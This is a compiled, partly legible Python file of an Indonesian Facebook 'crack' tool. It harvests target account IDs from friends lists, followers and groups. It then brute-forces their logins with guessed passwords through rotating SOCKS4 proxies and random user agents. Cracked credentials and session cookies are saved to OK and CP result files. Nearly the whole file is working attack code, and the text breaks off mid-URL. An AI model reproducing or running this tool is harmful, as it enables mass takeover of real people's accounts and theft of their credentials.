o
    �cI�  �                   @   s�  d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dl	Z	d dl
Z
d dlZd dlmZ d dlmZ d dlmZ d dlmZ d dlmZ d dlmZ d dl
mZ d d	lmZ  d d
l!m"Z# d dl
mZ$ d dl
m%Z% d dl&m'Z( e%�)�  e� Z*g Z+g Z,g Z-e �.� Z/g Z0ze �1d�j2Z3e4dd��5e3� W n e6y� Z7 z
ed� W Y dZ7[7ndZ7[7ww e4dd��8� �9� Z3e:d�D ]�Z;dZ<e�=dd�Z>e�=dd�Z?dZ@e�=dd�Z7dZAe�=dd�ZBe�=dd�ZCe�=dd�ZDe�=dd�ZEdZFe<� e>� de?� de@� e7� eA� eB� deC� deD� deE� deF� �ZGe+�HeG� dZIe�Jg d��Z>d Z?e�Jg d!��Z@e�=dd"�Z7e�Jg d!��ZAd#ZBe�=d$d�ZCd%ZDe�=d&d'�ZEe�=d(d)�ZFd*ZKeI� de>� d+e?� e@� e7� eA� d,eB� eC� deD� deE� deF� deK� �ZLe,�HeL� q�e:d-�D ]`ZMd.Z<e�=dd�Z>e�=dd�Z?e�Jg d!��Z@e�Jg d!��Z7e�Jg d!��ZAe�Jg d!��ZBe�=dd�ZCd/ZDe�=dd�ZEe�=dd�ZFdZKe<� e>� d0e?� e@� e7� eA� eB� eC� eD� eE� deF� deK� �ZN�qxd1d2� ZGg g d d d g g g g g g g g f\ZOZPaQaRaSZTZUZVZWZXZYZZZ[g Z-g g Z\Z]d3Z^d4Z_d5Z`d6Zad7Zbd8Zcd9Zdd:Zed;Zfd<Zgd=ZMd4Zhd>ZFd5ZCd?Zid@ZjdAZkd9Z>dBZle�JeheFeCeje>g�ZmdCdDdEdFdGdHdIdJdKdLdMdNdO�ZndCdDdEdFdGdHdIdJdKdLdMdPdQ�Zoej�p� jqZrenesej�p� jt� Zuej�p� jvZwdReser� dS eseu� dS esew� dT ZxdUeser� dS eseu� dS esew� dT ZydVdW� ZzdXdY� Z{dZd[� Z|d\d]� Z}d^d_� Z~e~�  d`da� Zdbdc� Z�ddde� Z�dfdg� Z�dhdi� Z�djdk� Z�dldm� Z�e>dn eC do e> dp Z�dqdr� Z�dsdt� Z�dudv� Z�dwdx� Z�dydz� Z�d{d|� Z�d}d~� Z�dd�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�e�d�k�rCze��d�� W n   Y ze��d�� W n   Y ze��d�� W n   Y ze��d�� W n   Y ze��d�� W n   Y e�  dS )��    N)�Table)�Console)�BeautifulSoup)�ThreadPoolExecutor)�Group)�Panel)�print)�Markdown)�Columns)�pretty)�Textzwhttps://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=allz	.prox.txt�wu.   [[[1;92m•[1;97m] [[1;96mAlvino_adijaya_xy�ri'  z Mozilla/5.0 (Linux; Android 5.0;�   �	   zSM-G900V Build/LRX21T)�d   i'  z;AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.133�   zMobile Safari/537.36�.� zMozilla/5.0 (iPhone;)�6�7�8�9�10�11�12z#CPU iPhone OS 11_2_1 like Mac OS X))�A�B�C�D�E�F�G�H�I�J�K�L�M�N�O�P�Q�R�S�T�U�V�W�X�Y�Zi�  z4AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0�I   �0ih  i$  �(   �   zMobile/15C153 Safari/604.1z; z) �
   z"Mozilla/5.0 (Linux; Android 4.4.2;z;AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132�/c                  C   s�   zt dd��� �� } | D ]}t�|� qW d S    t�d�j}t dd�} t�	dt
|��}|D ]	}| �|d � q/t dd��� �� } Y d S )Nz	bbnew.txtr   z0https://github.com/EC-1709/a/blob/main/bbnew.txtz
.bbnew.txtr   zline">(.*?)<�
)�open�read�
splitlines�ugen�append�requests�get�text�re�findall�str�write)�uaZub�a�aaZun� rL   �&/storage/emulated/0/Download/londo1.py�uakuJ   s   �
rN   z[1;97mz[1;91mz[1;92mz[1;93mz[1;94mz[1;95mz[1;96mz[0mz[1;30mz[41m[1;97mz[mz[93mz[32mz[95mz[33mz[0;34mZJanuaryZFebruaryZMarchZAprilZMayZJuneZJulyZAugustZ	SeptemberZOctoberZNovemberZDecember)�1�2�3�4�5r   r   r   r   r   r   r   ZDevember)�01�02�03�04�05�06�07�08�09r   r   r   zOK-�-z.txtzCP-c                 C   s2   | d D ]}t j�|� t j��  t�d� qd S )Nr<   g{�G�zt?)�sys�stdoutrH   �flush�time�sleep)�u�erL   rL   rM   �	alvino_xyx   s   2re   c                   C   s   t �d� d S )N�clear)�os�systemrL   rL   rL   rM   rf   z   s   rf   c                   C   s
   t �  d S )N)�loginrL   rL   rL   rM   �back|   s   
rj   c                   C   sL   t �  tdt� dt� dt� dt� dt� dt� t� dt� dt� dt� �� d S )N�	u�   ______                                              

     ██╗ █████╗ ███╗   ██╗ ██████╗ ██████╗ ██╗  ██╗
     ██║██╔══██╗████╗  ██║██╔════╝██╔═══██╗██║ ██╔╝
     ██║███████║██╔██╗ ██║██║     ██║   ██║█████╔╝ 
██   ██║██╔══██║██║╚██╗██║██║     ██║   ██║██╔═██╗ 
╚█████╔╝██║  ██║██║ ╚████║╚██████╗╚██████╔╝██║  ██╗
 ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝
                                                   
  	
			�   •z Author : firman )rf   re   �asu�m�k�h�sir�xrL   rL   rL   rM   �banner   s(   

�
�
�
�
�
�
�
�
�rs   c                  C   s.   t d�} | dkrtd� d S td� | �  d S )Nzmasukin password sc nya: zlondo-jancokzselamat akses di terimazlisensi salah)�inputr   )�lisensirL   rL   rM   ru   �   s
   
ru   c                  C   s�   zgt dd��� } t dd��� }t�| � z&tjdtd  d|id�}t�|j�d }t�|j�d	 }t	||� W W d S  t
yH   t�  Y W d S  tjjyg   d
}t|dd�}t� j|dd� t�  Y W d S w  tyt   t�  Y d S w )N�
.token.txtr   �.cok.txtz:https://graph.facebook.com/me?fields=id,name&access_token=r   �cookie��cookies�name�idz2# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN�red�ZstyleZcyan)r=   r>   �tokenkurA   rB   rC   �json�loadsrD   �menu�KeyError�login_lagi334�
exceptions�ConnectionError�mark�solr   �exit�IOError)�token�cokZsyZsy2Zsy3�li�lorL   rL   rM   ri   �   s(   
��ri   c                  C   s>  zst �d� t�  ttd�� t�ttt	t
tg�} tdt	� dt� d| � d��}tjddd	d
ddddddd�	d|id�}t�d|j�}tdd��|�d��}tdd��|�}tdt� dt	� dt� dt	� dt� d�� t�d� t�  W d S  ty� } zt �d� t �d� tdtttttf � t�  W Y d }~d S d }~ww ) Nrf   u8   	©©© Saran Ektensi : [green]Cookiedough[white] ©©©z  [rl   z] Masukkan Cookies :r   z0https://business.facebook.com/business_locationsz�Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/96.0.4664.104 Mobile Safari/537.36zhttps://www.facebook.com/zbusiness.facebook.comzhttps://business.facebook.comrO   �#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7�	max-age=0z�text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8ztext/html; charset=utf-8)	�
user-agent�refererZhost�origin�upgrade-insecure-requests�accept-language�cache-control�accept�content-typerx   )�headersrz   z	(EAAG\w+)rv   r   r   rw   z  �[�]z5 LOGIN BERHASIL.........Jalankan Lagi Perintahnya!!!!zrm -f .token.txtzrm -f .cok.txtz6  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!%s)rg   rh   rs   �cetak�nel�random�choicern   ro   rp   �brc   rt   rr   rB   rC   rE   �searchrD   r=   rH   �groupr   ra   rb   r�   �	Exception)rm   rx   �dataZ
find_tokenZkenr�   rd   rL   rL   rM   r�   �   s&   
(2

��r�   c                 C   sp  zt dd��� }t dd��� }W n ty%   td� t�d� t�  Y nw t�d� t	�  t
�d�j}ttd|  �� td	t|� � td
|� �� td� td� td� td� td� td� td� td�}|dv rtt�  d S |dv r}t�  d S |dv r�t�  d S |dv r�t�  d S |dv r�t�  d S |dv r�t�d� t�d� td� t�  d S td� t�  d S )Nrv   r   rw   u   [×] Cookies Kadaluarsa �   rf   zhttps://api.ipify.orgz(	Selamat Datang [green]%s[white] Ngentodz>> Your Idz : z>> Your Ip  : � z>> 1. Crack Publik z>> 2. Crack Follower z>> 3. Crack Grup   z>> 4. Crack File	z>> 5. Hasil Crack  z>> 0. Keluar       �
>> Pilih : )rO   )rP   )rQ   )rR   )rS   )r7   zrm -rf .token.txtzrm -rf .cookie.txtz>> Sukses Logout+Hapus Kukis z>> Pilih Yang Bener Asu )r=   r>   r�   r   ra   rb   r�   rg   rh   rs   rB   rC   rD   r�   r�   re   rG   rt   �dump_massalZdump_follower�error�
crack_file�resultr�   rj   )Zmy_nameZmy_idr�   r�   ZipZ_____alvino__adijaya_____rL   rL   rM   r�   �   sN   

�









r�   c                   C   s&   t t� dt� �� t�d� t�  d S )Nz$>> Maaf Fitur Ini Masih Di Perbaiki r   )r   ro   rr   ra   rb   rj   rL   rL   rL   rM   r�   �   s   

r�   c                  C   s�  t d� t d� t d� td�} | dv �r*zt�d�}W n ty1   t d� t�d� t�  Y nw t|�d	krFt d
� t�d� t�  d S d	}i }|D ]o}zt	d| d��
� }W n   Y qL|d7 }|dk r�dt|� }|�t|�t|�i� |�|t|�i� t d| d | d tt|�� d t � qL|�t|�t|�i� t dt|� d | d tt|�� d t � qLtd�}z|| }W n ty�   t d� t�  Y nw zt	d| d��� �� }	W n   t d� t�d� t�  Y d	}
tt|	��D ]#}|	|
 �d�}d|d	 � d|d � �}t� � t|dd�� |
d7 }
q�td� t�  d S | dv �rYzt�d�}W n t�yL   t d� t�d� t�  Y nw t|�d	k�rbt d� t�d� t�  d S d	}i }|D ]s}zt	d| d��
� }W n   Y �qh|d7 }|d k �r�dt|� }|�t|�t|�i� |�|t|�i� t d| d | d tt|�� d t � �qh|�t|�t|�i� t dt|� d | d tt|�� d t � �qhtd�}z|| }W n t�y�   t d� t�  Y nw zt	d| d��� �� }	W n   t d� t�d� t�  Y d	}
tt|	��D ]1}|	|
 �d�}d|d	 � d|d � �}t� � t|d!d�� t t� d"t� |d � �� |
d7 }
�qtd� t�  d S | d#v �rct�  d S t d� t�  d S )$Nz>> Hasil OK Anda z>> Hasil CP Anda z>> Kembali	r�   �rO   rT   �CPz>> File Tidak Di Temukan �   r   z >> Anda Tidak Memiliki Hasil CP �   �CP/r   r   r:   r7   r�   �] � [ �
 Account ]�>> Pilih Yang Bener Kontol �|z# ID : z PASSWORD : Zyellowr~   z[ Klik Enter ]�rP   rU   �OKz >> Anda Tidak Mempunyai File OK �OK/r   �greenz	COOKIE : )r7   Z00)r   rt   rg   �listdir�FileNotFoundErrorra   rb   rj   �lenr=   �	readlinesrG   �updaterr   r�   r�   r>   r?   �range�splitr�   r�   �hh)Zkz�vin�cih�lol�isi�hem�nom�geeh�geh�linZnocpZcpkuZcpkuniZcpkuhrL   rL   rM   r�   �   s�   


�


.2
�





�


04
�




r�   c               
   C   s  zt dd��� } t dd��� }W n ty   t�  Y nw zttd��}W n ty5   td� t�  Y nw |dk s>|dkrEtd� t�  t�	� }d	}t
|�D ]}|d7 }td
t|� d �}t�|� qOtD ]W}z9|jd| d td	  d|id��� }|d d D ]}	z|	d d |	d  }
|
tv r�nt�|
� W q�   Y q�W qg ttfy�   Y qg tjjy�   td� t�  Y qgw ztd� tdt� �ttt�� � t�  W d S  tjjy�   tt� � td� t�  Y d S  ttf�y   tdt� dt� �� t�d� t�  Y d S w )Nrv   r   rw   z>> Mau Berapa Target Njing ? : z'>> Masukkan Angka Anjing, Malah Huruff r   r   z>> Gagal Dump Idz r   z>> Masukkan Idz Yang Ke z : z https://graph.facebook.com/v2.0/z)?fields=friends.limit(5000)&access_token=rz   ry   Zfriendsr�   r|   r�   r{   z>> Sinyal Loh Kek Kontoll r�   u   >> Total Idz Yang Terkumpul🔥z>> Sinyal Lo kek Kontol �>>z Pertemanan Tidak Public r�   )r=   r>   r�   r�   �intrt   �
ValueErrorr   rB   �Sessionr�   rG   �uidrA   rC   r   r�   r|   r�   r�   r�   rp   r�   �settingrr   rj   ro   ra   rb   )r�   r�   Zjum�sesZyzZmetZklZuserr�col�miZisorL   rL   rM   r�   N  sf   
�
�&

�
�
�

�r�   c               	   C   s  zt dd��� } t dd��� }W n ty   t�  Y nw td� td�}zDtjd| d td  d	|id
��	� }|d d D ]}zt
�|d d |d  � W q?   Y q?tdt� d�ttt
�� � t�  W d S  tjjy|   td� t�  Y d S  ttfy�   td� t�  Y d S w )Nrv   r   rw   z2>> Ketik ( me ) Jika Ingin Crack Follower Sendiri z>> Masukkan Idz Target : zhttps://graph.facebook.com/z.?fields=subscribers.limit(99999)&access_token=r   rx   ry   Zsubscribersr�   r|   r�   r{   z>> Total Idz :r   z>> Koneksi Internet Bermasalah z>> Gagal Mengambil Target )r=   r>   r�   r�   r   rt   rB   rC   r   r�   r|   rA   rp   rG   r�   r�   r�   r�   r�   )r�   r�   ZpilZkoh2�pirL   rL   rM   �dump_pengikut}  s,   
�& 
�r�   r�   u   ✓r�   c                   C   s@   t dt t d ttt�� d � ttt d � 	 t�  d S )N�z) [1;95mTotal ID Yang Terkumpul :[1;97m z                     zA[1;97m Klik [[1;96m Enter ][1;97m Jika Ingin Langsung Crack !!)r   �balmondrn   rG   r�   r|   rt   r�   rL   rL   rL   rM   �lah�  s   $
r�   c                  C   s�  t d� tdt t d �} d}d|i}d|  }t�� }zt|j||d�jd�}W n tj	j
yD   t tt d � t�d	� t�  Y nw |�d
�}|j�dd��dd�}|dkrjt tt d � t�d	� t�  n|dkrttt d � t�d	� t�  n	 t dt t d | � |�d�}g }	|D ]}
|
j}|�dd�}zt|�}|	�|�}W q�   Y q�t|	�dkr�t tt d � nt tt d t|	d � � t|� d S )Nr�   z& [1;94m>> Masukkan Idz Grup :[1;94m �sMozilla/5.0 (Linux; Android 11; V2026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36r�   z#https://mbasic.facebook.com/groups/�r�   �html.parserz Koneksi Internet Terputus..g      �?�title� | Facebook� Grup Publik�Masuk Facebookz- Limit, Silahkan Mode Pesawat Dan Coba Lagi..Z	Kesalahanz Grup Tidak Ditemukan..z [1;94m>> Nama Grup :[1;97m �tableZAnggotar   z Anggota : -z [1;94m>> Anggota :[1;97m )r   rt   r�   rp   rB   r�   �parserrC   rD   r�   r�   rn   ra   rb   r�   �find�replaceZ
crack_grupZjalan�p�find_allr�   rA   r�   rG   �grup1)r|   rI   �miskinlu�urlr�   ZgnZberrZberr2ZggsZangZffZanggoZbroZmexZjumlahrL   rL   rM   �grup�  sN   

�



r�   c                 C   s�  g }t �� }tdt t d � ttt d � ttt d � 	 �zd}d|i}z|d }W n   | }Y t|j||d	�jd
�}|�d�}|D ]$}t	|��
d�}	d|	v rlt	|��dd��dd�}
|
�
d�d �dd�}qH|�d�}|D ]�}|j}|�
d�}d|v r�t�dt	|��}|d �dd�}|�dd�}|d | }|tv r�qtt�|� tdt t d t d t	tt�� t d dd� tj��  qtd|v �rt�dt	|��}|d �dd�}|�
d�d }|d | }|tv r�qtt�|� tdt t d t d t	tt�� t d dd� tj��  qtqtz|}|�dd| � W n   |�d �}|j�d!d��d"d�}|d#k�r;nt�  Y W n- t jj�ya   zt�d$� W n t�y^   t�  Y nw Y n t�ym   t�  Y nw q!)%Nr�   z+ [1;94mJika Berhenti, Mode Pesawat 5 Detikz [1;94mSedang Mengumpulkan IDz! [1;94mTekan CTRL + C Untuk StopTr�   r�   r   r�   r�   rJ   �>zLihat Postingan Lainnya</spanz	<a href="zamp;r   z"><imgr�   Z
mengajukanzcontent_owner_id_new.\w+zcontent_owner_id_new.z mengajukan pertanyaan .r�   r�   z { zProses Mengambil ID z }��endz > zMengumpulkan ID �https://mbasic.facebook.comr�   r�   r�   r�   �   )rB   r�   r   r�   rn   r�   rC   rD   r�   rG   r�   r�   rE   rF   r|   rA   rp   ro   r�   r^   r_   r`   r*   �insertr�   r�   r�   r�   ra   rb   �KeyboardInterrupt)ZurlsZuser�   rI   r�   r�   �setZbf2�gZcssZbcjZbcj2ZtesZcariZliatnihZsplZidsiapaZidyouZnamayouZidkuZlink_ZgirangZgirang2rL   rL   rM   r�   �  s�   
�


@

@

�
��
��r�   c            
      C   s   zt �d�} W n ty   td� t�d� t�  Y nw t| �dkr1td� t�d� t�  d S d}i }| D ]v}ztd| d��	� }W n   Y q7|d7 }|d	k rd
t
|� }|�t
|�t
|�i� |�|t
|�i� tdt� dt� d�||t|�f � q7|�t
|�t
|�i� tdt
|� d | d t
t|�� d t � td||t|�f � q7td�}z|| }W n ty�   tt� dt� �� t�d� t�  Y nw ztd| d��� �� }W n   td� t�d� t�  Y |D ]}	t�|	� q�t�  d S )N�DUMPz>> File Tidak Ditemukan r�   r   z!>> Kamu Tidak Memiliki File Dump zDUMP/r   r   r   r�   z>> %s. %s (z %sz idz )r�   r�   r�   r�   z>> %s. %s ({h} %s {x}idz) r�   r�   r�   z)>> File Tidak Ditemukan, Coba Lagi Nanti )rg   r�   r�   r   ra   rb   rj   r�   r=   r�   rG   r�   rp   rr   rt   r�   ro   r>   r?   r|   rA   r�   )
r�   r�   r�   r�   r�   r�   r�   r�   r�   ZxidrL   rL   rM   r�     sN   

�


&0

�

r�   c                  C   s�  t t� d�� t d� t d� t d� td�} | dv r(tt�D ]}t�|� qnL| dv rUg }tt�D ]}|�|� q2t|�}|d }t|�D ]}t�|| � |d8 }qFn| d	v rmtD ]}t	�
d
tt��}t�||� q[nt d� t�  t d� t d� t d� t d� td�}|dv r�t�d� n|dv r�t�d� nt�d� t d� td�}	|	dv r�t�d� ttd�� td�}
|
�d�}|D ]}t�|� q�nt�d� t�  d S )Nz>> 1. Akun Old z>> 2. Akun New z>> 3. Random r�   �>> Pilih : r�   r�   r   )rQ   rV   r   z>> Pilih Yang Bener Kontooll z>> 1. Mobile z>> 2. mediafire z>> 3. free  �mobile)rR   rW   �mbasicz%>> Tambahkan Password Manual ( Y/t ) ��yr4   �yau   [[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter
[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] z >> Masukkan Password Tambahan : �,�no)r   rr   rt   �sortedr|   �id2rA   r�   r�   r�   �randintr�   r�   �method�pwplussr�   r�   r�   �pwnya�passwrd)�huZtuaZmudaZbacotZbcmZbcmiZxmudZxxZhcZpwplusZpwkuZpwkuhZxpwrL   rL   rM   r�   ,  s`   �
��
	

�

r�   c                  C   s�  t dt� dt� dt� dt� dt� dt� dt� dt� d�� t d� t dt� dt� dt� d	t� �t � t dt� d
t� dt� dt� �t � t dt� dt� d�� tdd���} tD ]�}|�	d�d |�	d�d �
� }}|�	d�d }g }t|�dk r�t|�dk r�n<|�|d � |�|d � |�|d � n&t|�dk r�|�|� n|�|� |�|d � |�|d � |�|d � dtv r�tD ]}|�|� q�n	 dtv r�| �t||� qXdtv r�| �t||� qXdtv r�| �t||� qXdtv r�| �t||� qX| �t||� qXW d   � n	1 �sw   Y  t d� ttd�� t d t� dt� d!t� d"t� d#�	t � t t� d t� dt� d!t� d$t� d%t� d�t � t d� t d&� td'�}|d(v �r`t�  d S t d)t� d*t� d+t� d,�� t�d-� t�  d S ).Nz>>>>> rl   z Sedang Menggeser Matahari z <<<<< r�   z	>> Hasil r�   z Tersimpan Di : zOK/%s r�   zCP/%s z>> Mainkan Mode Pesawat Setiap Z1kz Idz
�   )Zmax_workersr�   r   r   r   �   r�   Z123Z1234Z12345r�   r�   ZfreeZtouchr�   zK	[cyan]>>[green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan] <<[white] r�   r�   z OK : z%s z CP : z%sz">> Lanjut Crack Kembali ( Y/t ) ? r�   r�   rk   r�   z Good Bye Dadaahhz << r�   )r   rn   ro   rp   rr   �okc�cpc�tredr�   r�   �lowerr�   rA   r   r  r�   �submit�crack�	crackfree�
cracktouch�crackmbasicr�   r�   r�   �ok�cprt   rj   ra   rb   r�   )�poolZyuzong�idfZnmfZfrs�pwvZxpwdZwoirL   rL   rM   r  k  sd   :$$"
���"&0



r  c                  C   sd  t �ttttttg�}tj	�
dt� dt� t� t� dt� tt�� t� dt� dt� t� t� dt� dt� t� t� d|� d�tttt�� �� t� d��f tj	��  t �dg�}t �d	g�}t�� }|D �]I}�z5t �t�}d
d| i}|j�dddd|dddddd�
� |�d|  d �}	t�dt|	j���d�t�dt|	j���d�| dd|d�}
d� dd � |	j!�"� �#� D ��}|d!7 }i d"d�d#d�d$d%�d&d�d'd(�d)d�d*d+�d,d-�d.|�d/d�d0d1�d2d�d3d�d4d�d5d|  d �d6d7�d8d�}|j$d9|
d:|i|d;|d<�}d=|j!�"� �%� v �r@t&t'd>�� t(d?t)� d@| � dA|� t*� �� t+dBt, dC��
| dA | dD � t-�.| dA | � td7 aW  nldE|j!�"� �%� v �r�td7 a|j!�"� }d� dFd � |j!�"� �#� D ��}t&t'dG�� t(d?t� d@| � dA|� dA|� dD|� t*� �� t+dHt/ dC��
| dA | dA | dD � t0t1|� W  nW qa tj2j3�y�   t4�5dI� Y qaw td7 ad S )JNu   🎉 r�   r;   �   ]—�   ]—[�{:.0%}�]  z�Mozilla/5.0 (Linux; Android 9; zh-tw; HTC_2Q4D100 Build/PPRL.190405.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.4290.47 Mobile Safari/537.36z�Mozilla/5.0 (iPhone; 7; CPU iPhone OS 11_2_1 like Mac OS X)O379S) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.073.0.4265.138 Mobile/15C153 Safari/604.1�httpz	socks4://�m.facebook.comr�   �?1rO   ��text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9�same-origin�cors�emptyr�   �
�Hostr�   �sec-ch-ua-mobiler�   r�   r�   �sec-fetch-site�sec-fetch-mode�sec-fetch-destr�   �8https://m.facebook.com/login/device-based/password/?uid=�h  &flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr�name="lsd" value="(.*?)"r   �name="jazoest" value="(.*?)"�"  https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified�login_no_pin�Zlsd�jazoestr�   �nextZflow�pass�;c                 S   �   g | ]
\}}d ||f �qS �z%s=%srL   ��.0�key�valuerL   rL   rM   �
<listcomp>�  �    zcrack.<locals>.<listcomp>�  m_pixel_ratio=2.625; wd=412x756r   r�   �	sec-ch-ua�(" Not A;Brand";v="99", "Chromium";v="98"r!  �sec-ch-ua-platform�	"Android"r�   r�   �https://m.facebook.comr�   �!application/x-www-form-urlencodedr�   r�   �x-requested-with�XMLHttpRequestr"  r#  r$  r�   �accept-encoding�gzip, deflate, brr�   zQhttps://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_IDrx   F�r�   rz   r�   �allow_redirectsZproxies�
checkpoint�"     [red]     🙄JANCOK CP🙄[red]r�   �>> r�   r�   rJ   r<   �c_userc                 S   r0  r1  rL   r2  rL   rL   rM   r6  �  r7  �'   [green]      🤣 JANCOK OK 🤣[green]r�   r�   )6r�   r�   rn   ro   rp   r�   rc   rr   r^   r_   rH   r+   �loopr�   r|   r#   r  r  �format�floatr`   rB   r�   �proxr�   r�   rC   rE   r�   rG   rD   r�   �joinrz   �get_dict�items�post�keysr�   r�   r   r&   r)   r=   r  �akunrA   r  �cek_apk�sessionr�   r�   ra   rb   )r  r  ZborI   �ua2r�   �pw�nip�proxsr�   �dataa�koki�heade�po�coki�kukirL   rL   rM   r  �  sL   ~


":r 
*(
�r  c                 C   sV  t j�d�g d�t� �d�t� �d�t� �d�t� �d�t� �t� �t� �d�|� �tt	�� �t� �d�t� �d�t
� �t� �t� �d�t� �d�t� �t� �t� �d�t� �d	�tttt	�� �� �t� �d
���f t j��  t�d�}t�d�}t�� }|D �]�}�z�|j�dddd|dddddd�
� |�d�}t�dt|j���d�t�dt|j���d�| dd|d�}d�dd � |j� � �!� D ��}|d!7 }i d"d�d#d�d$d%�d&d�d'd(�d)d�d*d+�d,d-�d.|�d/d�d0d1�d2d�d3d�d4d�d5d�d6d7�d8d�}	t�dt|j���d�t�dt|j���d�| d9d|d�}d�d:d � |j� � �!� D ��}|d!7 }i d"d�d#d�d$d%�d&d�d'd(�d)d�d*d+�d,d-�d.|�d/d�d0d1�d2d�d3d�d4d�d5d;|  d< �d6d7�d8d�}	|j"d=|d>|i|	d?t#d@�}
dA|
j� � �$� v �r�t%dBt&� dC| � dD|� t'� �� t(�)dE� t*dFt+ dG��| dD | dH � t,�-| dD | � td7 aW  npdI|j� � �$� v �rt.t/dJ�� td7 a|
j� � }d�dKd � |j� � �!� D ��}t.t/dL�� t%dBt
� dC| � dD|� dD|� t'� �	� t(�)dM� t*dNt0 dG��| dD | dH � t1t2|� W  nW q� tj3j4�y$   t5�6dO� Y q�w td7 ad S )PNr�   u   🔥 r�   ZMbasicr�   r;   r  r  r  r  z�Mozilla/5.0 (Linux; U; Android 3.4; zh-CN; MX6 Build/WKJ72L) Gecko/20100447 Chrome/100.0.655.45 Mobile Safari/534.40 S40OviBrowser/9.10.0.0.17z�Mozilla/5.0 (Linux; Android 8.1.0; Pixel C Build/OPM8.190605.005; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Safari/537.36 Instagram 172.0.0.21.123 Android (27/8.1.0; 320dpi; 1800x2448; Google/google; Pixel C; dragon; dragor  r�   r  rO   r  r  r  r  r�   r  a�  https://m.facebook.com/login.php?skip_api_login=1&api_key=124578887583575&kid_directed_site=0&app_id=124578887583575&signed_next=1&next=https%3A%2F%2Fmobile.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fapp_id%3D124578887583575%26cbt%3D1661161889857%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df86eb6919f1aec%2526domain%253Dwww.mediafire.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.mediafire.com%25252Ff3286caca7e6248%2526relation%253Dopener%26client_id%3D124578887583575%26display%3Dtouch%26domain%3Dwww.mediafire.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.mediafire.com%252Flogin%252F%26locale%3Den_US%26logger_id%3Df36c5689f29cb6c%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df357e7157f7ded4%2526domain%253Dwww.mediafire.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.mediafire.com%25252Ff3286caca7e6248%2526relation%253Dopener%2526frame%253Df11116867059048%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv2.9%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df357e7157f7ded4%26domain%3Dwww.mediafire.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.mediafire.com%252Ff3286caca7e6248%26relation%3Dopener%26frame%3Df11116867059048%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_